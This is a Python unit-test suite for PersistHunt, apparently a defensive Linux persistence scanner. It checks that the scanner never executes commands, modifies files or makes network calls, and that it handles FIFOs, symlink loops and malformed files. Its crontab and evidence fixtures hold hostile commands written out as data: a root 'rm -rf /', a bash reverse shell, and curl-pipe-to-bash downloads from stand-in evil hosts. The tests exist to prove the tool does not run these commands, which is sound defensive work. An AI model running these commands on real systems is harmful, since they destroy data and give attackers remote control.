import io
import os
import sys
import stat
import json
import socket
import urllib.request
import subprocess
from pathlib import Path
from tempfile import TemporaryDirectory
import unittest
from unittest.mock import patch, MagicMock

from persisthunt.findings import Finding, FindingCollection, Severity
from persisthunt.detectors.base import BaseDetector, safe_read_lines, safe_read_text, MAX_SAFE_FILE_SIZE
from persisthunt.detectors.cron import CronDetector
from persisthunt.detectors.systemd import SystemdDetector
from persisthunt.detectors.ssh import SSHDetector
from persisthunt.detectors.shell import ShellDetector
from persisthunt.detectors.suid import SuidDetector
from persisthunt.detectors.process import ProcessDetector
from persisthunt.detectors.account import AccountDetector
from persisthunt.reporting import ScanReport, generate_report
from persisthunt.cli import main, run_scan, EXIT_SUCCESS, EXIT_ERROR, EXIT_THREAT_DETECTED


class TestSecurityAndHardening(unittest.TestCase):
    """Comprehensive test suite for security, safety, and reliability guarantees."""

    def setUp(self):
        self.tmpdir_obj = TemporaryDirectory()
        self.tmp = Path(self.tmpdir_obj.name)

    def tearDown(self):
        self.tmpdir_obj.cleanup()

    # -------------------------------------------------------------------------
    # 1. SAFETY VERIFICATION: ZERO COMMAND EXECUTION, ZERO MODIFICATIONS, ZERO NETWORK
    # -------------------------------------------------------------------------

    def test_safety_zero_command_execution(self):
        """Verify PersistHunt never executes discovered malicious commands."""
        # Setup fixture with nasty commands
        root = self.tmp / "test_exec"
        root.mkdir()
        crontab = root / "crontab"
        crontab.write_text(
            "* * * * * root rm -rf / --no-preserve-root\n"
            "* * * * * root /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
            "* * * * * root curl -sL http://evil.site/payload.sh | bash\n"
        )

        def forbidden_exec(*args, **kwargs):
            raise AssertionError(f"SECURITY VIOLATION: Execution attempted with args={args} kwargs={kwargs}")

        with patch("subprocess.run", side_effect=forbidden_exec), \
             patch("subprocess.Popen", side_effect=forbidden_exec), \
             patch("os.system", side_effect=forbidden_exec), \
             patch("os.popen", side_effect=forbidden_exec):
            detector = CronDetector(system_crontab=crontab, cron_d_dir=root / "empty_d")
            findings = detector.scan()
            self.assertGreater(len(findings), 0)

    def test_safety_zero_filesystem_or_state_modifications(self):
        """Verify PersistHunt never modifies permissions, accounts, or files."""
        root = self.tmp / "test_mods"
        root.mkdir()
        passwd = root / "passwd"
        passwd.write_text("toor:x:0:0:root:/root:/bin/bash\n")

        def forbidden_mod(*args, **kwargs):
            raise AssertionError(f"SECURITY VIOLATION: Modification attempted with args={args} kwargs={kwargs}")

        with patch("os.chmod", side_effect=forbidden_mod), \
             patch("os.chown", side_effect=forbidden_mod), \
             patch("os.remove", side_effect=forbidden_mod), \
             patch("os.unlink", side_effect=forbidden_mod), \
             patch("os.rmdir", side_effect=forbidden_mod), \
             patch("pathlib.Path.unlink", side_effect=forbidden_mod), \
             patch("pathlib.Path.rmdir", side_effect=forbidden_mod), \
             patch("pathlib.Path.chmod", side_effect=forbidden_mod):
            detector = AccountDetector(passwd_path=passwd, shadow_path=root / "nonexistent", group_path=root / "none")
            findings = detector.scan()
            self.assertEqual(len(findings), 1)
            self.assertEqual(findings[0].id, "PH-ACCT-001")

    def test_safety_zero_external_network_activity(self):
        """Verify PersistHunt never connects to external network sockets."""
        def forbidden_connect(*args, **kwargs):
            raise AssertionError(f"SECURITY VIOLATION: Outbound network call attempted: args={args} kwargs={kwargs}")

        with patch("socket.socket.connect", side_effect=forbidden_connect), \
             patch("urllib.request.urlopen", side_effect=forbidden_connect):
            # Run all detectors against host or empty root
            CronDetector().scan()
            SystemdDetector().scan()
            SSHDetector().scan()
            ShellDetector().scan()

    # -------------------------------------------------------------------------
    # 2. DETECTOR ISOLATION & STATUS TRACKING
    # -------------------------------------------------------------------------

    def test_detector_isolation_partial_failure_handled(self):
        """A broken detector throwing an unhandled exception does not terminate the scan."""
        class CrashingDetector(BaseDetector):
            name = "Crashing Module"
            detector_id = "crash"
            def scan(self):
                raise RuntimeError("Catastrophic internal hardware failure")

        class GoodDetector(BaseDetector):
            name = "Healthy Module"
            detector_id = "good"
            def scan(self):
                c = FindingCollection()
                c.add(Finding("PH-GOOD-001", "good", Severity.LOW, "Healthy Finding", "All good"))
                return c

        mock_registry = {
            "crash": CrashingDetector,
            "good": GoodDetector,
        }

        with patch.dict("persisthunt.cli.DETECTOR_REGISTRY", mock_registry, clear=True), \
             patch("sys.stdout", new=io.StringIO()) as out, \
             patch("sys.stderr", new=io.StringIO()) as err:
            exit_code = main(["scan", "--json", "-q"])
            self.assertEqual(exit_code, EXIT_SUCCESS)

            # Check that report contains findings from the healthy detector
            data = json.loads(out.getvalue())
            self.assertEqual(len(data["findings"]), 1)
            self.assertEqual(data["findings"][0]["id"], "PH-GOOD-001")

            # Check detector_status tracking
            status = data["detector_status"]
            self.assertEqual(status["crash"]["status"], "failed")
            self.assertIn("Catastrophic internal hardware failure", status["crash"]["error"])
            self.assertEqual(status["good"]["status"], "successful")

    def test_detector_permission_limited_status_tracking(self):
        """A detector that encounters permission restrictions is tracked as permission-limited."""
        class PermLimitedDetector(BaseDetector):
            name = "Restricted Module"
            detector_id = "restricted"
            def scan(self):
                c = FindingCollection()
                c.add(Finding(
                    "PH-TEST-090", "restricted", Severity.INFO,
                    "Permission denied reading file", "Access was denied"
                ))
                return c

        mock_registry = {"restricted": PermLimitedDetector}

        with patch.dict("persisthunt.cli.DETECTOR_REGISTRY", mock_registry, clear=True), \
             patch("sys.stdout", new=io.StringIO()) as out, \
             patch("sys.stderr", new=io.StringIO()):
            code = main(["scan", "-c", "restricted", "--json", "-q"])
            self.assertEqual(code, EXIT_SUCCESS)
            data = json.loads(out.getvalue())
            self.assertEqual(data["detector_status"]["restricted"]["status"], "permission-limited")

    # -------------------------------------------------------------------------
    # 3. SPECIAL FILES: NAMED PIPES (FIFOS) & RESOURCE LIMITS (HUGE FILES)
    # -------------------------------------------------------------------------

    def test_fifo_named_pipe_does_not_block_detectors(self):
        """Verify detectors never hang when encountering FIFO special files."""
        fifo_path = self.tmp / "malicious_fifo"
        try:
            os.mkfifo(fifo_path)
        except (AttributeError, OSError):
            self.skipTest("mkfifo not supported in environment")

        # Test safe_read_lines and safe_read_text on FIFO
        with self.assertRaises(OSError) as ctx:
            safe_read_lines(fifo_path)
        self.assertIn("Non-regular or special file", str(ctx.exception))

        with self.assertRaises(OSError) as ctx2:
            safe_read_text(fifo_path)
        self.assertIn("Non-regular or special file", str(ctx2.exception))

        # Test CronDetector on FIFO crontab
        cron = CronDetector(system_crontab=fifo_path)
        findings = cron.scan()
        # Should record an INFO or handle safely without hanging
        self.assertTrue(all(f.severity == Severity.INFO for f in findings))

    def test_huge_file_rejection_prevents_dos(self):
        """Verify files exceeding 10MB safety limit are rejected to prevent memory exhaustion."""
        huge_file = self.tmp / "huge_config.conf"
        # Create a sparse file of 15MB
        with open(huge_file, "wb") as f:
            f.seek(15 * 1024 * 1024)
            f.write(b"\0")

        with self.assertRaises(OSError) as ctx:
            safe_read_lines(huge_file)
        self.assertIn("exceeds safety limit", str(ctx.exception))

        with self.assertRaises(OSError) as ctx2:
            safe_read_text(huge_file)
        self.assertIn("exceeds safety limit", str(ctx2.exception))

    # -------------------------------------------------------------------------
    # 4. SYMLINKS, BROKEN SYMLINKS, AND CIRCULAR DIRECTORIES
    # -------------------------------------------------------------------------

    def test_broken_symlinks_handled_gracefully(self):
        """Dangling symlinks should be recorded as LOW anomalies or skipped without crash."""
        broken_link = self.tmp / "dangling_link"
        broken_link.symlink_to(self.tmp / "nonexistent_target")

        # Test Cron scheduled dir with broken link
        cron_d = self.tmp / "cron.d"
        cron_d.mkdir()
        (cron_d / "bad_link").symlink_to(self.tmp / "ghost")

        cron = CronDetector(cron_d_dir=cron_d, system_crontab=self.tmp / "none")
        findings = cron.scan()
        self.assertTrue(any(f.id == "PH-CRON-091" for f in findings))

    def test_circular_directory_symlink_terminates(self):
        """SuidDetector must boundedly terminate even when encountering circular symlinks."""
        search_root = self.tmp / "circular_tree"
        search_root.mkdir()
        sub = search_root / "subdir"
        sub.mkdir()
        # Create symlink back to search_root
        (sub / "loop").symlink_to(search_root, target_is_directory=True)

        suid = SuidDetector(search_paths=[search_root])
        # Must complete cleanly without RecursionError
        findings = suid.scan()
        self.assertIsInstance(findings, FindingCollection)

    # -------------------------------------------------------------------------
    # 5. UNUSUAL UNICODE, EMOJIS, AND MALFORMED FILES
    # -------------------------------------------------------------------------

    def test_unusual_unicode_and_emoji_filenames(self):
        """Filenames with non-ASCII characters and emojis must not crash detectors."""
        cron_d = self.tmp / "cron_unicode"
        cron_d.mkdir()
        unicode_file = cron_d / "задача_🚀_persist.sh"
        unicode_file.write_text("* * * * * root /tmp/evil\n", encoding="utf-8")

        cron = CronDetector(cron_d_dir=cron_d, system_crontab=self.tmp / "none")
        findings = cron.scan()
        self.assertGreater(len(findings), 0)

    def test_malformed_syntax_across_detectors(self):
        """Corrupt, truncated, or binary files must be handled gracefully."""
        # 1. Corrupt crontab
        corrupt_cron = self.tmp / "corrupt_crontab"
        corrupt_cron.write_bytes(b"\xff\xfe\x00\x01not a crontab line\n\x00\x00\n")
        cron = CronDetector(system_crontab=corrupt_cron)
        cron_findings = cron.scan()
        self.assertIsInstance(cron_findings, FindingCollection)

        # 2. Corrupt passwd file
        bad_passwd = self.tmp / "corrupt_passwd"
        bad_passwd.write_text("invalid_line_without_colons\ntoor:x:NOT_A_UID:0:root:/root:/bin/bash\n")
        acct = AccountDetector(passwd_path=bad_passwd, shadow_path=self.tmp / "none", group_path=self.tmp / "none")
        acct_findings = acct.scan()
        self.assertIsInstance(acct_findings, FindingCollection)

        # 3. Corrupt systemd unit
        bad_unit = self.tmp / "bad.service"
        bad_unit.write_text("gibberish\n[Service]\nExecStart\n===\n")
        sysd = SystemdDetector(system_dirs=[self.tmp], user_dirs=[])
        sysd_findings = sysd.scan()
        self.assertIsInstance(sysd_findings, FindingCollection)

    # -------------------------------------------------------------------------
    # 6. EMPTY FILES AND UNEXPECTED FILESYSTEM STRUCTURES
    # -------------------------------------------------------------------------

    def test_empty_files_produce_zero_false_positives(self):
        """0-byte files should be handled without errors or crashing."""
        empty_cron = self.tmp / "empty_crontab"
        empty_cron.touch()

        cron = CronDetector(system_crontab=empty_cron, cron_d_dir=self.tmp / "none")
        findings = cron.scan()
        self.assertEqual(len(findings), 0)

    def test_unexpected_filesystem_structures(self):
        """Handles cases where directory is expected but file exists, or vice versa."""
        # /etc/cron.d is a regular file instead of a directory
        fake_cron_d = self.tmp / "cron_d_as_file"
        fake_cron_d.write_text("I am a file, not a directory\n")

        cron = CronDetector(cron_d_dir=fake_cron_d, system_crontab=self.tmp / "none")
        findings = cron.scan()
        self.assertIsInstance(findings, FindingCollection)

        # /etc/passwd is a directory instead of a regular file
        fake_passwd_dir = self.tmp / "passwd_as_dir"
        fake_passwd_dir.mkdir()

        acct = AccountDetector(passwd_path=fake_passwd_dir, shadow_path=self.tmp / "none", group_path=self.tmp / "none")
        findings = acct.scan()
        self.assertIsInstance(findings, FindingCollection)

    # -------------------------------------------------------------------------
    # 7. INVALID CLI ARGUMENTS AND JSON SERIALIZATION INTEGRITY
    # -------------------------------------------------------------------------

    def test_invalid_cli_arguments(self):
        """CLI gracefully handles bad arguments and raises SystemExit(2)."""
        with patch("sys.stderr", new=io.StringIO()):
            # Unknown command line flag raises SystemExit with code 2
            with self.assertRaises(SystemExit) as cm:
                main(["scan", "--nonexistent-option-xyz"])
            self.assertEqual(cm.exception.code, 2)

    def test_json_serialization_handles_special_characters(self):
        """ScanReport.to_json handles control characters, emojis, and quotes safely."""
        collection = FindingCollection()
        collection.add(Finding(
            id="PH-TEST-001",
            category="cron",
            severity=Severity.HIGH,
            title='Finding with "quotes", \nnewlines, \ttabs, and emojis: 🕵️‍♂️🔥',
            description="Null \x00 byte handling and \r\n line breaks.",
            evidence='curl "http://evil.com?param=\'value\'&x=1" | bash',
            location="/etc/cron.d/test:10",
            recommendation="Remediate safely."
        ))

        report = generate_report(collection, host="test-host")
        json_str = report.to_json()
        parsed = json.loads(json_str)

        self.assertEqual(parsed["tool"], "PersistHunt")
        self.assertEqual(len(parsed["findings"]), 1)
        self.assertIn("🕵️‍♂️🔥", parsed["findings"][0]["title"])


if __name__ == "__main__":
    import io
    unittest.main()
